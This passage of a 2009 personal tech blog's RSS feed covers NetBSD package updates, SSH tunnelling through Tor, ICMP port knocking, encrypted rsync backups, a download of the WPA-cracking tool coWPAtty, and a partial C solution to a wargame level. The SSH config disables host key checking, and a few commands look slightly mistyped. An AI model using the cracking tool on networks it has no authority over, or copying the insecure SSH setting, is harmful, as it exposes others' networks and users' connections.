</code></pre></div><p>in the <strong>page.tpl.php</strong>. What the heck?! Finally the whole voodoo thing developed into a struggle and I was on the verge of a nervous breakdown. After hours of errors seeking I was able to diagnose the 2nd main cause: The whole caching system was kind of messy. I came into Drupals <a href="http://api.drupal.org/api/function/drupal_rebuild_theme_registry/6">drupal_rebuild_theme_registry()</a> function and cleaned up the theme registry. What came next? TinyMCE&rsquo;s JavaScript files were successfully loaded into the page!!! <strong>HAPPY END</strong>!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Keep your system up2date!</title>
      <link>https://blog.dornea.nu/2009/09/07/keep-your-system-up2date/</link>
      <pubDate>Mon, 07 Sep 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/09/07/keep-your-system-up2date/</guid>
      <content:encoded><![CDATA[<p>Due to NetBSDâ€™s great packaging system, software gets updated very frequently. It is very important to have a clean and safe system running and no outdated packages on your system. They might be vulnerable to recently discovered bugs and affect your systemsâ€™s security and performance. After updating the package tree (see <a href="http://www.netbsd.org/docs/pkgsrc/using.html">documentation</a>), I usually update my whole system by running:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ pkg_chk -su
</code></pre></div><p>Actually there is nothing wrong about that. Yet there is one big problem, which caused me to seek for another updating mechanism.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ pkg_chk -sun &gt; pkg_chk.log
</code></pre></div><p>The log file might look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">archivers/gtar-base - gtar-base-<span style="color:#3677a9">1.20</span> &lt; gtar-base-<span style="color:#3677a9">1.22</span>
WARNING: No archivers/lzma-utils/Makefile - <span style="color:#6ab825;font-weight:bold">package</span> moved or obsolete<span style="color:#a61717;background-color:#e3d2d2">?</span>
archivers/unrar - unrar-<span style="color:#3677a9">3.8.3</span> &lt; unrar-<span style="color:#3677a9">3.9.5</span>
archivers/zip - zip-<span style="color:#3677a9">2.32</span> &lt; zip-<span style="color:#3677a9">3.0</span>nb1
archivers/zziplib - zziplib-<span style="color:#3677a9">0.10.82</span>nb3 &lt; zziplib-<span style="color:#3677a9">0.13.56</span>
audio/amarok - amarok-<span style="color:#3677a9">1.4.10</span>nb4 &lt; amarok-<span style="color:#3677a9">1.4.10</span>nb5
audio/cdparanoia - cdparanoia-<span style="color:#3677a9">3.0.9.8</span>nb8 &lt; cdparanoia-<span style="color:#3677a9">3.0.10.2</span>nb1
audio/libcddb - libcddb-<span style="color:#3677a9">1.3.0</span> &lt; libcddb-<span style="color:#3677a9">1.3.2</span>
audio/libvorbis - libvorbis-<span style="color:#3677a9">1.2.0</span>nb1 &lt; libvorbis-<span style="color:#3677a9">1.2.3</span>
audio/nas - nas-<span style="color:#3677a9">1.9.1</span>nb1 &lt; nas-<span style="color:#3677a9">1.9.1</span>nb2
audio/pulseaudio - pulseaudio-<span style="color:#3677a9">0.9.14</span>nb2 &lt; pulseaudio-<span style="color:#3677a9">0.9.14</span>nb4
audio/speex - speex-<span style="color:#3677a9">1.2</span>rc1 &lt; speex-<span style="color:#3677a9">1.2</span>rc1nb1
audio/wavpack - wavpack-<span style="color:#3677a9">4.41.0</span> &lt; wavpack-<span style="color:#3677a9">4.50.1</span>
chat/libpurple - libpurple-<span style="color:#3677a9">2.5.7</span> &lt; libpurple-<span style="color:#3677a9">2.6.1</span>
chat/pidgin - pidgin-<span style="color:#3677a9">2.5.7</span> &lt; pidgin-<span style="color:#3677a9">2.6.1</span>
databases/sqlite - sqlite-<span style="color:#3677a9">2.8.16</span>nb2 &lt; sqlite-<span style="color:#3677a9">2.8.17</span>
databases/sqlite3 - sqlite3-<span style="color:#3677a9">3.6.16</span> &lt; sqlite3-<span style="color:#3677a9">3.6.17</span>
devel/SDL - SDL-<span style="color:#3677a9">1.2.13</span>nb4 &lt; SDL-<span style="color:#3677a9">1.2.13</span>nb5
devel/apr - apr-<span style="color:#3677a9">1.3.5</span> &lt; apr-<span style="color:#3677a9">1.3.8</span>
devel/apr-util - apr-util-<span style="color:#3677a9">1.3.7</span> &lt; apr-util-<span style="color:#3677a9">1.3.9</span>
devel/autoconf - autoconf-<span style="color:#3677a9">2.63</span> &lt; autoconf-<span style="color:#3677a9">2.64</span>
...

<span style="color:#3677a9">15</span>:<span style="color:#3677a9">52</span> /usr/pkg/sbin/pkg_delete -K /<span style="color:#6ab825;font-weight:bold">var</span>/db/pkg -r gtar-base-<span style="color:#3677a9">1.20</span>
<span style="color:#3677a9">15</span>:<span style="color:#3677a9">52</span> /usr/pkg/sbin/pkg_delete -K /<span style="color:#6ab825;font-weight:bold">var</span>/db/pkg -r unrar-<span style="color:#3677a9">3.8.3</span>
<span style="color:#3677a9">15</span>:<span style="color:#3677a9">52</span> /usr/pkg/sbin/pkg_delete -K /<span style="color:#6ab825;font-weight:bold">var</span>/db/pkg -r zip-<span style="color:#3677a9">2.32</span>
<span style="color:#3677a9">15</span>:<span style="color:#3677a9">52</span> /usr/pkg/sbin/pkg_delete -K /<span style="color:#6ab825;font-weight:bold">var</span>/db/pkg -r zziplib-<span style="color:#3677a9">0.10.82</span>nb3
<span style="color:#3677a9">15</span>:<span style="color:#3677a9">52</span> /usr/pkg/sbin/pkg_delete -K /<span style="color:#6ab825;font-weight:bold">var</span>/db/pkg -r amarok-<span style="color:#3677a9">1.4.10</span>nb4
<span style="color:#3677a9">15</span>:<span style="color:#3677a9">52</span> /usr/pkg/sbin/pkg_delete -K /<span style="color:#6ab825;font-weight:bold">var</span>/db/pkg -r cdparanoia-<span style="color:#3677a9">3.0.9.8</span>nb8
<span style="color:#3677a9">15</span>:<span style="color:#3677a9">52</span> /usr/pkg/sbin/pkg_delete -K /<span style="color:#6ab825;font-weight:bold">var</span>/db/pkg -r libcddb-<span style="color:#3677a9">1.3.0</span>
...

[ Rechecking packages after deletions ]
</code></pre></div><p>o before updating any package â€œpkg_chkâ€ will first delete the package AND its dependencies. This will take a lot of time when youâ€™ll have to update big packages, e.g. Firefox. All its dependencies will be first updated and then the main package (in this case Firefox).</p>
<p>If you want to save time and effort, you should better use another utility called â€œpkg_rolling-replaceâ€. This will rebuild or update packages using â€œmake replaceâ€ in tsorted order. For more information click <a href="http://pkgsrc.se/pkgtools/pkg_rolling-replace">here</a>.</p>
<p>In order to update all packages on my system and ensure correct shared library dependencies, I run following commando:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ pkg_rolling-replace -rsuv
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>NetBSD, kernel downgrade and some voodoo!</title>
      <link>https://blog.dornea.nu/2009/08/20/netbsd-kernel-downgrade-and-some-voodoo/</link>
      <pubDate>Thu, 20 Aug 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/08/20/netbsd-kernel-downgrade-and-some-voodoo/</guid>
      <content:encoded><![CDATA[<p>I don&rsquo;t know if you still remember my ACPI suspend/resume problems a few months ago. I once suspended my Linux system to RAM and forgotten to make a proper shutdown. After a while the battery discharged and my laptop was out of power. After some reboots (there were about 15 tries) I finally managed it to boot my system again. Some BIOS error occured every time. That error still keeps my busy. I couldn&rsquo;t find out the cause for the strange BIOS error. The fact of matter is that my laptop behaved strange for about 3-4 months: I couldn&rsquo;t shutdown properly (I always had to force shutdown by pressing the power-off button) and the suspend functionality didn&rsquo;t work well.</p>
<p>Then came the voodoo effect! One night (about 3 weeks ago) I was about to shutdown my system (meanwhile NetBSD 5.0) and surprisingly IT DID SHUTDOWN! No power-off button! Just a smooth shutdown as expected!</p>
<p>What the hell happened? It came so suddenly&hellip; However I was very pleased about that. But wait.. The story still goes on! Today I did some kernel downgrade from NetBSD-current to NetBSD 5.0.1  and enabled the APM (ACPI Power Managment) support for my kernel. I build the new userland, rebooted the system and I was looking for the <code>apm</code>command in /usr/sbin&hellip; Not found! I quickly joined the #netbsd channel on Freenode and asked for some help.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sysctl -w macdeep.sleep_state=3
</code></pre></div><p>That was the command I was looking for! When ACPI is enabled on your system you can easily suspend/resume your system using the <code>sysctl</code> utility. Thanks #netbsd and NetBSD for such a great OS!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>FU here I come!</title>
      <link>https://blog.dornea.nu/2009/08/12/fu-here-i-come/</link>
      <pubDate>Wed, 12 Aug 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/08/12/fu-here-i-come/</guid>
      <content:encoded><![CDATA[<p>Hiermit mÃ¶chte ich verkÃ¼nden, dass meine Wahl auf die <a href="http://www.fu-berlin.de/">FU Berlin</a> fiel. Welche Wahl? Na die UNI-Wahl! NÃ¤chste Woche gehts dann los mit der Immatrikulation, im Oktober mit dem Studium. Das <a href="https://www.mi.fu-berlin.de/kvv/semester.htm?iid=1">Vorlesungsverzeichnis</a> schaut schon mal gut aus. Ich freu mich auf jeden Fall!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: SSH-Tunnel over CorkScrew using Tor</title>
      <link>https://blog.dornea.nu/2009/08/05/howto-ssh-tunnel-over-corkscrew-using-tor/</link>
      <pubDate>Wed, 05 Aug 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/08/05/howto-ssh-tunnel-over-corkscrew-using-tor/</guid>
      <content:encoded><![CDATA[<p>Nowadays it seems like we&rsquo;re loosing our privacy and are being taped by video cameras all over. The same applies to Internet surveillance: By daily traffic analysis you can find out who is talking to whom over a public network. This traffic allows others to track your click behaviour and interests. So if any mailicious guy has access to your network traffic (@work, @home â€¦) he will try to find more information about you, like e.g. the sites you visit, the server(s) you ownâ€¦ The other way around: You don&rsquo;t want anybody else (host provider etc.) to know from which IP&rsquo;s you&rsquo;ve connected to your server! Proxies are very useful and cover up your traces. This <strong>paranoid</strong> way of thinking might have several reasons&hellip; You just might want to keep your identity secret, right? Privacy at its best!? Well here is an approach how to do that.</p>
<h2 id="a-ssh-">a) SSH &hellip;</h2>
<p>Supposing you have installed SSH, you might have a look at <code>~/.ssh/config</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Host *
HashKnownHosts yes
StrictHostKeyChecking no
Host [your host]
User [your user]
Port [hosts port]
...
</code></pre></div><p>Since the SSH client itself is not able to make connections over proxies, a 3rd party tool is required. Of course you could use the <code>-D</code> flag to create a SOCKS proxy. If so, all localhost connections using that proxy will be made first through the host you just connected by SSH. Indeed, you might use SOCKS 4/5 proxies but this is far behind the scope of this paper. I&rsquo;ll focus now only on HTTP/HTTPS proxies.</p>
<h2 id="b-ssh-over-corkscrew-">b) SSH over CorkScrew &hellip;</h2>
<p>Corkscrew enables you to run SSH connections over HTTP/HTTPS proxies. You can find it <a href="http://www.agroman.net/corkscrew/">here</a></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">corkscrew 2.0 (agroman@agroman.net)
usage: corkscrew &amp;lt; proxyhost &amp;gt; &amp;lt; proxyport &amp;gt; &amp;lt; desthost &amp;gt; &amp;lt; destport &amp;gt; [authfile]
</code></pre></div><p>At this point you can add following line to your SSH config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ProxyCommand [path/to/corkscrew] [proxy host] [proxy port] %h %p
</code></pre></div><p>The &ldquo;%h&rdquo; (host) and &ldquo;%p&rdquo; (port) options will automatically be replaced by SSH with the actual destination host and port. There is no magic behind that line. It just tells the SSH client to make the connection using an external application, in our case CorkScrew. Afterwards you should be able to connect to your host by running:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ssh [your host]
</code></pre></div><p>If no error messages arise, then you successfully connected to your host using an external HTTP/HTTPS proxy!</p>
<h2 id="c-ssh-over-corkscrew-using-tor">c) SSH over CorkScrew using Tor!</h2>
<p>This paper wouldn&rsquo;t have been complete, if I didn&rsquo;t mention the <a href="http://www.torproject.org/">Tor</a> + <a href="http://www.privoxy.org/">Privoxy</a> suite. If you need help compilling/installing them, just grab some help on Google. If you succeeded in configuring Tor and Privoxy, then you can run them on your local system. Tor should be running on port <strong>9050</strong>, Privoxy on <strong>8118</strong> (check out the configuration files). If everything went well, you should now have a web proxy running on port <strong>8118</strong>. You can use it within Firefox, wget, curl, links, lynx etc. Let&rsquo;s go back to our SSH tunnel. After making sure Tor and Privoxy are running you should add this line to your SSH config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ProxyCommand [path/to/corkscrew] localhost 8118 %h %p
</code></pre></div><p>That&rsquo;s all! I hope you enjoyed this one. Cya next time and enjoy your privacy!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>icmpKNOCK - ICMP port knocking server</title>
      <link>https://blog.dornea.nu/2009/07/31/icmpknock-icmp-port-knocking-server/</link>
      <pubDate>Fri, 31 Jul 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/07/31/icmpknock-icmp-port-knocking-server/</guid>
      <content:encoded><![CDATA[<h2 id="whats-this-about">Whats this about?</h2>
<p>If you&rsquo;re familiar with port knocking, you should know the basics and how this technique basically works. If don&rsquo;t have a clue what I&rsquo;m talking about, feel free to have a look at the <em>Links</em> section. Most port knocking tools are listening for TCP or UDP packets to arrive on specific ports in a specific order. icmpKNOCK is waiting for ICMP echo requests and checks their payloads. Packets that match given criteria trigger some action, e.g. open/close port(s) etc. The main advantage of this tool is the fact that this approach works with all standard ping tools, regardless of your operating system.</p>
<h2 id="how-to-use-it">How to use it</h2>
<p>a) Define some unique keys (MD5, SHA1 etc.):
b) Define actions (check out icmpKNOCK_actions.py)
c) run icmpKNOCK.py as root!!! otherwise you won&rsquo;t be able to listen for incoming ICMP requests
d) Using your <code>ping</code> utility you can pass hex patterns to the requests:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ping -p [hex pattern] [host]
</code></pre></div><p>Be aware of the order in which you send the packets. Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">@set_action(hex1, hex2, hex3, ...)
</code></pre></div><p>When you run ping keep in mind to first send key1, then key2, then&hellip; You got it, right? Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ping -p hex1 [host] 
$ ping -p hex2 [host] 
... 
</code></pre></div><h2 id="links">Links</h2>
<ul>
<li><a href="http://www.portknocking.org/">http://www.portknocking.org/</a></li>
<li><a href="http://www.faqs.org/rfcs/rfc791.html">http://www.faqs.org/rfcs/rfc791.html</a> * <a href="http://www.faqs.org/rfcs/rfc792.html">http://www.faqs.org/rfcs/rfc792.html</a></li>
</ul>
<p><strong>Download <a href="https://github.com/dorneanu/icmpKNOCK">here!</a></strong></p>
<p><img src="/posts/img/2010/200/icmpknock1.png" alt="icmpknock"></p>
<p><img src="/posts/img/2010/200/icmpknock2.png" alt="icmpknock actions"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>CoWPAtty 4.2 for NetBSD</title>
      <link>https://blog.dornea.nu/2009/07/22/cowpatty-4.2-for-netbsd/</link>
      <pubDate>Wed, 22 Jul 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/07/22/cowpatty-4.2-for-netbsd/</guid>
      <content:encoded><![CDATA[<p>From <a href="http://wirelessdefence.org/Contents/coWPAttyMain.htm">http://wirelessdefence.org/Contents/coWPAttyMain.htm</a>:</p>
<blockquote>
<p><em>coWPAtty is designed to audit the pre-shared key (PSK) selection for WPA networks based on the TKIP protocol.</em> - Joshua Wright.</p>
</blockquote>
<p>Since I had problems installing/compiling cowpatty, I had to modify the Makefile and several include-lines in some files. Currently I&rsquo;m using NetBSD/Amd64. Feel free to modify the files at your needs. <a href="http://dornea.nu/system/files/cowpatty-4.2-NetBSD.tar_.gz"></a>Download <a href="http://ul.to/vexnr9">here</a>!</p>
<p>Edit: As stated <a href="http://www.renderlab.net/projects/WPA-tables/">here</a>, there is a newer version, <a href="http://www.willhackforsushi.com/code/cowpatty/4.3/cowpatty-4.3.tgz">4.3</a>. I edited the Makefile and created a new <a href="http://ul.to/2jvm0j">tarball</a>. <code>make -D __NETBSD__</code> should do the work.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Ganxtaville52 Luebecker Hood</title>
      <link>https://blog.dornea.nu/2009/07/08/ganxtaville52-luebecker-hood/</link>
      <pubDate>Wed, 08 Jul 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/07/08/ganxtaville52-luebecker-hood/</guid>
      <content:encoded><![CDATA[<p><a href="http://2.bp.blogspot.com/_cWvrXazPQTw/SlOIq2l9yPI/AAAAAAAAAAk/SQqIwr5zuI4/s320/P7070455.JPG" title="Ganxtaville 52" rel="lightbox"><img style="float: left; padding-right: 10px;" src="http://2.bp.blogspot.com/_cWvrXazPQTw/SlOIq2l9yPI/AAAAAAAAAAk/SQqIwr5zuI4/s320/P7070455.JPG" alt="Ganxtaville 52" title="Ganxtaville 52" width="150" height="113" /></a>Lieber Victor, wir wollen dir eine ganz besondere Ehre zu Teil kommen lassen und dir unseren offiziellen WG-Blog vorstellen:</p>
<p><a href="http://ganxtaville52.blogspot.com/">http://www.ganxtaville52.blogspot.com/</a></p>
<p>Es ist etwas wirklich wertvolles, also teile diese festgehaltenen Momente auch nur mit Menschen, die dir wirklich nahe stehen und dir etwas bedeuten.</p>
<p>Viel SpaÃŸ dabei, um Kommentare, Anregungen usw. wird gebeten.</p>
<p>Beste GrÃ¼ÃŸe, Paul aus der LÃ¼becker Str.</p>
<p><strong>ALSO LEUTE: Geht auf ganxtaville52.blogspot.com!!!</strong></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: RsynCrypto - The backup jewel</title>
      <link>https://blog.dornea.nu/2009/06/25/howto-rsyncrypto-the-backup-jewel/</link>
      <pubDate>Thu, 25 Jun 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/06/25/howto-rsyncrypto-the-backup-jewel/</guid>
      <content:encoded><![CDATA[<p>Nowadays it is essential to backup your data and keep it safe in case of a data loss event. The most common way to backup (private) data is to use a remote server where you can upload your data. Certainly you want to keep it safe and <strong>private</strong> So how do you want to guarantee the privacy of the files stored? Upload it to the server and encrypt it afterwards?! Somehow you want to automate this backup process so you don&rsquo;t have to do nothing than running the backup script. Suppose you have a huge amount of data (GB / TB) you&rsquo;ll have to backup every day. Then you&rsquo;ll have to upload the data completely to the server and do the encryption stuff. So your next question in mind should be: How to save bandwidth usage and keep it to a minimum?</p>
<p>Apparently you&rsquo;ll have to encrypt your data first and then commit the in-file changes to the server. This works similar to the CVS/SVN versioning systems. So here are the steps:</p>
<ol>
<li>Encrypt data using rsyncrypto</li>
<li>Transfer data (changes) to server using rsync</li>
</ol>
<p>Quite simple, isn&rsquo;t it? Let&rsquo;s start by configuring and installing the required tools. (For the next steps I&rsquo;ll be using NetBSD 5.0. But most Unix systems include rsync and rsyncrypto in their packaging systems.) Â </p>
<h2 id="installing-required-tools">Installing required tools</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cd /usr/pkgsrc/net/rsync
make install clean CLEANDEPENDS=1
</code></pre></div><p>If you don&rsquo;t find <code>rsync</code> in your packages list, then you&rsquo;ll have to download it and from <a href="http://www.samba.org/rsync/">here</a>. I couldn&rsquo;t find <code>rsyncrypto</code> in NetBSDs package tree so I&rsquo;ve downloaded it from <a href="http://rsyncrypto.lingnu.com/index.php/Home_Page">here</a>. Be carefull when configuring the package on NetBSD:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ LDFLAGS=-L/usr/pkg/lib CPPFLAGS=-I/usr/pkg/include ./configure
</code></pre></div><p>Now both tools shoud work and execute properly.</p>
<h2 id="generate-backup-keys">Generate backup keys</h2>
<p>Therefore we&rsquo;ll be using OpenSSL. We&rsquo;ll generate a backup key and a certificate used for encryption. Remeber: Keep these files safe and don&rsquo;t lose them!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">openssl req -nodes -newkey rsa:2046 -x509 
    -keyout /backup/openssl/backup.key -out /backup/openssl/backup.crt
</code></pre></div><p>Check out the man page for parameters explication.</p>
<h2 id="encrypt-data">Encrypt data</h2>
<p>Let us now encrypt our data.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">rsyncrypto -r --name-encrypt=/encrypted/backup/map /encrypted/ /tmp/enc /encrypted/backup/enc.keys /encrypted/keys/openssl/backup.crt
</code></pre></div><p>Quite simple, isn&rsquo;t it? Here is a quick explanation:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Main syntax of rsyncrypto: 
rsyncrypto [options] src dst key master key
In our case:
&#34;-r&#34;          -- directory names are processed recursively
&#34;--name-encrypt=translation_file&#34;   --  Encrypt file names
&#34;/encrypted&#34;    -- Directory to be encrypted
&#34;/tmp/enc&#34;       -- Where to store encrypted data temporarily
&#34;enc.keys&#34;      --  Keys file or directory
&#34;backup.crt&#34;    -- Master key (public key certificate or private key)
</code></pre></div><p>Now all we have to do is to rsync the encrypted data to some remote server.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">rsync --progress --delete -ave /tmp/enc user@host:/dir/where/to/store/data
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>OverTheWire: Vortex Level0</title>
      <link>https://blog.dornea.nu/2009/05/21/overthewire-vortex-level0/</link>
      <pubDate>Thu, 21 May 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/05/21/overthewire-vortex-level0/</guid>
      <content:encoded><![CDATA[<p>So what&rsquo;s this whole thing about? &ldquo;The wargames offered by the OverTheWire community can help you to learn and practice security concepts in the form of funfilled games.&rdquo; by <a href="http://www.overthewire.org/wargames/">OverTheWire.org</a>. So I started with <a href="http://www.overthewire.org/wargames/vortex/">Vortex</a> and coded an example how to read 4 integers from server, sum them up, send result to server and get the login information back from server again. Sounds quite simple. I admit I had to refresh my knowledge about linux socket programming and go through some coding examples. And here is my solution for<a href="http://www.overthewire.org/wargames/vortex/level0.shtml"> level0</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"> * ========================================================
 *
 *       Filename:  vortex_level0.c  
 *
 *    Description:  Read <span style="color:#3677a9">4</span> integers from vortex.labs.pulltheplug.org:<span style="color:#3677a9">5842</span>, sum
 *                  them up, send result to server and get login data
 *
 *        Version:  <span style="color:#3677a9">1.0</span>
 *        Created:  <span style="color:#3677a9">05</span>/<span style="color:#3677a9">20</span>/<span style="color:#3677a9">2009</span> <span style="color:#3677a9">08</span>:<span style="color:#3677a9">53</span>:<span style="color:#3677a9">53</span> PM
 *       Compiler:  gcc
 *
 *         Author:  Victor Dorneanu 
 *
 * ========================================================
 <span style="color:#a61717;background-color:#e3d2d2">*/</span>
<span style="color:#cd2828;font-weight:bold">#include</span> 
<span style="color:#cd2828;font-weight:bold">#include </span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> 
<span style="color:#cd2828;font-weight:bold">#include </span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> 
<span style="color:#cd2828;font-weight:bold">#include </span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> 
<span style="color:#cd2828;font-weight:bold">#include </span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> 
<span style="color:#cd2828;font-weight:bold">#include </span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#cd2828;font-weight:bold">#define HOSTNAME &#34;vortex.labs.pulltheplug.org&#34;
</span><span style="color:#cd2828;font-weight:bold">#define PORT &#34;5842&#34;
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#6ab825;font-weight:bold">void</span> die(<span style="color:#6ab825;font-weight:bold">char</span> *mess) { perror(mess); exit(<span style="color:#3677a9">1</span>); }

<span style="color:#6ab825;font-weight:bold">int</span> main(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> *argv[]) {
   <span style="color:#6ab825;font-weight:bold">int</span> sock, rv;
   <span style="color:#6ab825;font-weight:bold">struct</span> addrinfo hints, *servinfo, *p;
   <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span> buffer[<span style="color:#3677a9">4</span>];
   <span style="color:#6ab825;font-weight:bold">char</span> login_data[<span style="color:#3677a9">200</span>];
   <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span> received = <span style="color:#3677a9">0</span>;
   <span style="color:#6ab825;font-weight:bold">int</span> i, bytes;

   <span style="color:#999;font-style:italic">/*  Construct the server addrinfo structure */</span>
   memset(&amp;hints, <span style="color:#3677a9">0</span>, <span style="color:#6ab825;font-weight:bold">sizeof</span> hints);         <span style="color:#999;font-style:italic">/*  Clear struct */</span>
   hints.ai_family = AF_UNSPEC;             <span style="color:#999;font-style:italic">/*  IPv4 or IPv6 */</span>
   hints.ai_socktype = SOCK_STREAM;

   <span style="color:#6ab825;font-weight:bold">if</span> ((rv = getaddrinfo(HOSTNAME, PORT, &amp;hints, &amp;servinfo)) != <span style="color:#3677a9">0</span>) {
		fprintf(stderr, <span style="color:#ed9d13">&#34;getaddrinfo: %s</span>
<span style="color:#ed9d13">&#34;, gai_strerror(rv));</span>
		<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">1</span>;
	}

	<span style="color:#999;font-style:italic">// loop through all the results and make a socket
</span><span style="color:#999;font-style:italic"></span>	<span style="color:#6ab825;font-weight:bold">for</span>(p = servinfo; p != <span style="color:#24909d">NULL</span>; p = p-&amp;gt;ai_next) {
		<span style="color:#6ab825;font-weight:bold">if</span> ((sock = socket(p-&amp;gt;ai_family, p-&amp;gt;ai_socktype, p-&amp;gt;ai_protocol)) == -<span style="color:#3677a9">1</span>) {
			die(<span style="color:#ed9d13">&#34;Couldn&#39;t create socket&#34;</span>);
			<span style="color:#6ab825;font-weight:bold">continue</span>;
		}
		<span style="color:#6ab825;font-weight:bold">break</span>;
	}

   <span style="color:#999;font-style:italic">/*  Establish  connection */</span>
   <span style="color:#6ab825;font-weight:bold">if</span> (connect(sock, servinfo-&amp;gt;ai_addr, servinfo-&amp;gt;ai_addrlen) &amp;lt; <span style="color:#3677a9">0</span>) {
      die(<span style="color:#ed9d13">&#34;Failed to connect to server&#34;</span>);
   }

   <span style="color:#999;font-style:italic">/* Read 4 integers from server */</span>
   <span style="color:#6ab825;font-weight:bold">for</span> (i = <span style="color:#3677a9">0</span>; i &amp;lt; <span style="color:#3677a9">4</span>; i ++) 
      read(sock, &amp;buffer[i], <span style="color:#3677a9">4</span>);

   <span style="color:#999;font-style:italic">/* Sum up integers */</span>
   received = <span style="color:#3677a9">0</span>;
   <span style="color:#6ab825;font-weight:bold">for</span>(i=<span style="color:#3677a9">0</span>; i &amp;lt; <span style="color:#3677a9">4</span>; i++)  
      received += buffer[i];

   <span style="color:#999;font-style:italic">/*  Send sum to the server */</span>
   <span style="color:#6ab825;font-weight:bold">if</span> (send(sock, &amp;received, <span style="color:#6ab825;font-weight:bold">sizeof</span>(received), <span style="color:#3677a9">0</span>) != <span style="color:#6ab825;font-weight:bold">sizeof</span> received) {
      die(<span style="color:#ed9d13">&#34;Mismatch in number of sent bytes&#34;</span>);
   }

   <span style="color:#999;font-style:italic">/* Read login data */</span>
